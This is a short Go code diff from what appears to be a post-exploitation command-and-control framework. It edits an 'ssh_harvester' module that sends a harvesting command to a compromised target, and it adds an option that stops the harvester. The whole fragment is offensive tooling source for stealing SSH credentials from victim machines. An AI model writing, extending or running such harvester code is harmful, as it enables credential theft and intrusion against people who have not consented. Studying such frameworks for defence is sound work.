@@ -25,8 +25,15 @@ func module_ssh_harvester() {
 	if !ok {
 		LogError("reg_name not specified")
 	}
-	err := SendCmdToCurrentTarget(fmt.Sprintf("%s --code_pattern %s --reg_name %s",
-		emp3r0r_def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt.Val), strconv.Quote(reg_name_opt.Val)), "")
+	cmd := fmt.Sprintf("%s --code_pattern %s --reg_name %s",
+		emp3r0r_def.C2CmdSSHHarvester, strconv.Quote(code_pattern_opt.Val), strconv.Quote(reg_name_opt.Val))
+	stop_opt, ok := CurrentModuleOptions["stop"]
+	if ok {
+		if stop_opt.Val == "yes" {
+			cmd += " --stop"
+		}
+	}
+	err := SendCmdToCurrentTarget(cmd, "")
 	if err != nil {
 		LogError("SendCmd: %v", err)
 		return
